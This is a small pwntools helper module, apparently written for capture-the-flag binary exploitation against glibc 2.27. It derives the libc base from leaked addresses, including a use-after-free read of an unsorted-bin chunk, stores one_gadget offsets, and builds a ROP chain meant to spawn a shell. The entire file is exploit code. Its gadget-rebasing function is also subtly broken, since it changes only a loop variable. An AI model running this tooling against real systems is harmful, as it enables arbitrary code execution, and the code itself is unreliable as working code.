from pwn import *

#context.clear(arch='amd64')

libc = ELF("/mnt/libc-2.27.so")

one_gadgets = [0x4f2c5, 0x4f322, 0x10a38c]

def libc_base_from_symbol(symbol, addr):
    libc.address = 0
    libc.address = addr - libc.symbols[symbol]
    _update_one_gadgets()

def libc_base_from_unsorted_bin(addr):
    """UAF read chunk in unsorted bin, assumes only 1 chunk in bin"""
    libc.address = addr - 4111520
    _update_one_gadgets()

def libc_base(addr):
    """manually calc libc base and set"""
    libc.address = addr
    _update_one_gadgets()

def _update_one_gadgets():
    """bases one_gadgets to libc_base"""
    for gadget in one_gadgets:
        gadget += libc.address

def rop_autowin():
    """if libc_base is known and null bytes allowed, will drop to shell"""
    rop = ROP(libc)
    rop.call(0x3eb0b + libc.address) # pop rcx, ret
    rop.raw(p64(0))
    rop.call(0x4f2c5 + libc.address) # one_gadget rcx == null

    return str(rop)

